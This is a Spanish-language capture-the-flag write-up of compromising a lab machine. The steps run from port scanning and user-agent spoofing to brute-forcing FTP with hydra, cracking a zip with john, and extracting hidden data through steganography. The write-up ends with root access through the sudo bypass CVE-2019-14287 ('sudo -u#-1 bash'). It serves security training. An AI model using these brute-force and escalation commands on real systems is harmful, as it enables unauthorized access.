# Summary
- IP: 10.10.217.235
- Ports: 21,22,80
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  22 -> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
	-  80 -> Apache httpd 2.4.29

# Recon
- Reconocimiento básico de puertos:

```
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.116.216 -oG allPorts
``` 

- Reconocimiento profundo de puertos encontrados:

``` 
$sudo nmap -p22,80,139,445,8009,8080 -sCV 10.10.116.216 -oN targeted
```


- Analizamos la web, pero solo nos arroja un texto: Use your own codename as user-agent to access the site. from Agent R
- Con burpsuite interceptamos la petición al ingresar a la web y modificamos el USER AGENT, primero intentamos con "R" ya que está en el texto leido, y nos arroja un texto confirmándonos que existen 26 agentes más, seguimos probando con más letras en la consola jugando con CURL:

```
$curl -A "C" -L 10.10.217.235
```


- Con la letra "C" nos arroja un resultado, en el cual se nos menciona le nombre de uno de los agentes, el cual es "chris", con esta info, hacemos un ataque de fuerza bruta al servidor ftp:

```
$hydra -l chris -P /home/dante/SecLists/Passwords/Leaked-Databases/rockyou.txt ftp://10.10.217.235/
```

- Encontramos las credenciales de chris, nos conectamos por ftp y nos encontramos con 3 archivos, los descargamos todos a nuestra máquina:

```
ftp 10.10.217.235
```

- Analizamos los archivos: El archivo de texto nos dice que en una de las imágenes está una credencial, analizamos la imagen cutie.png:

```
$binwalk cutie.png
```

- Vemos que hay un zip oculto dentro de esta imagen, lo descargamos con el comando:

```
$binwalk -e cutie.png
```

- Vemos los archivos extraidos y nos encontramos con un zip encriptado, lo desencriptamos con john:

```
$zip2john 8702.zip > zip.hash

$sudo john -w:/home/dante/SecLists/Passwords/Leaked-Databases/rockyou.txt zip.hash
```

- Obtenemos la contraseña "alien", la cual usaremos para descomprimir el zip, como unzip nos da problemas, probamos con 7z:

```
$7z e 8702.zip
```

- Descomprimimos, y obtenemos un archivo de texto el cual nos brinda una credencial hasheada en base 64, la decodeamos:

```
$echo "QXJlYTUx" | base64 -d
```

- Obtenemos la contraseña "Area51", ahora analizamos la imagen .jpg en búsqueda de esteganografía con ayuda de la página https://futureboy.us/stegano/decinput.html
- Ingresamos la imagen, usamos "Area51" como contraseña y obtenemos otro texto, el cual nos da un nombre de usuario "james" y una contraseña, la cual usaremos para entrar por SSH:

```
$ssh james@10.10.217.235
```

- Encontramos la primera flag y una imagen, la descargamos para buscar en google y responder en la CTF (NO ES RELEVANTE)

```
$sudo scp james@10.10.217.235:Alien_autospy.jpg ~/
```

# ESCALANDO PRIVILEGIOS:

- Con sudo -l vemos lo siguiente: (ALL, !root) /bin/bash         lo que nos dice que no podemos ejecutar como root pero si como !root, buscamos vulerabilidades contra esto y encontramos el CVE-2019-14287 el cual nos dice que con el siguiente comando podemos escalar privilegios:

```
sudo -u#-1 bash
```

- Lo ejecutamos y ya tendremos acceso ROOT.

